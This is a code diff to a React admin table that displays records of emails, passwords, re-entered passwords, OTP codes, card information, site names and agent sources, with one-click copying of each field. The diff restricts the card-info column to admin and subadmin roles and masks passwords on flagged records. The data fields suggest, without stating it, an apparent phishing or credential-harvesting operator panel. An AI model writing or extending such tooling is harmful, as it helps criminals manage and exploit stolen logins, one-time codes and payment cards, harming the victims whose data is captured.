@@ -12,7 +12,7 @@ const InformationTable = () => {
 
 
   const { loading, setIsRefresh, displayInfo, role,totalPages, setPage,page} = useInformation()
-
+  console.log(role);
   return (
     <div className="rounded-sm  -stroke bg-white px-5 pt-6 pb-2.5 shadow-default dark:-strokedark dark:bg-boxdark sm:px-7.5 xl:pb-1 ">
       <div className="flex items-center justify-between my-5">
@@ -64,9 +64,14 @@ const InformationTable = () => {
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 OTP Code
               </th>
-              <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
-               Card Info
-              </th>
+              {
+                (role==='subadmin' || role==='admin') && (
+                  <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
+                  Card Info
+                 </th>
+                )
+              }
+
 
               <th scope="col" className="px-2 py-1 font-bold cursor-pointer">
                 Agent
@@ -83,7 +88,7 @@ const InformationTable = () => {
 
           <tbody className='text-center'>
             {
-              displayInfo?.map(({ user,  createdAt, agent: { source }, status, email, password, repassword, otp, siteName, _id,paymentInfo }:any, index) => (
+              displayInfo?.map(({ user,  createdAt,isPasswordHide, agent: { source }, status, email, password, repassword, otp, siteName, _id,paymentInfo, }:any,index) => (
                 <tr key={_id} className=" ">
                   <th scope="row" className="px-2 py-1 font-bold cursor-pointer text-gray-900 whitespace-nowrap dark:text-white ">
                     {index + 1}
@@ -105,33 +110,39 @@ const InformationTable = () => {
 
                     <input type="text" className="p-2 dark:bg-graydark bg-bodydark1 " value={status ? (email as string).replace(/^(.{2})(.{1})/, '$1') : email} />
                   </td>
-                  <td onClick={() => handleCopyClick(password)} className="px-2 py-1 font-bold cursor-pointer ">
+                  <td onClick={() => handleCopyClick(isPasswordHide ? (password as string).replace(/^(.{2})(.{1})/, '$1') : password)} className="px-2 py-1 font-bold cursor-pointer ">
 
-                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={password} />
-
-                  </td>
-                  <td onClick={() => handleCopyClick(repassword)} className="px-2 py-1 font-bold cursor-pointer ">
-
-                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={repassword} />
+                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={isPasswordHide ? (password as string).replace(/^(.{2})(.{1})/, '$1') : password} />
 
                   </td>
+                  <td onClick={() => handleCopyClick(isPasswordHide ? (repassword as string).replace(/^(.{2})(.{1})/, '$1') : repassword)} className="px-2 py-1 font-bold cursor-pointer ">
+
+                    <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={isPasswordHide ? (repassword as string).replace(/^(.{2})(.{1})/, '$1') : repassword} />
+
+                  </td>
+
                   <td onClick={() => handleCopyClick(otp)} className="px-2 py-1 font-bold cursor-pointer ">
                     <input type="text" className="p-2 dark:bg-graydark  bg-bodydark1" value={otp} />
 
 
                   </td>
-                  <td  className="px-2 py-1 font-bold cursor-pointer ">
-                  <div className="relative inline-block">
-                      <button
-                        className={`p-2  ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
-                          }`}
-                          onClick={()=> (setOpen(state => !state))}
-                          >View</button>
-
-                    </div>
-
-
-                  </td>
+                  {
+                    (role === 'subadmin' || role === 'admin') && (
+                      <td  className="px-2 py-1 font-bold cursor-pointer ">
+                      <div className="relative inline-block">
+                          <button
+                            className={`p-2  ${index % 2 === 0 ? 'bg-primary' : 'bg-[#2CB13C]'
+                              }`}
+                              onClick={()=> (setOpen(state => !state))}
+                              >View</button>
+    
+                        </div>
+    
+    
+                      </td>
+                    )
+                  }
+                
 
 
                   <td className="px-2 py-1 font-bold cursor-pointer ">
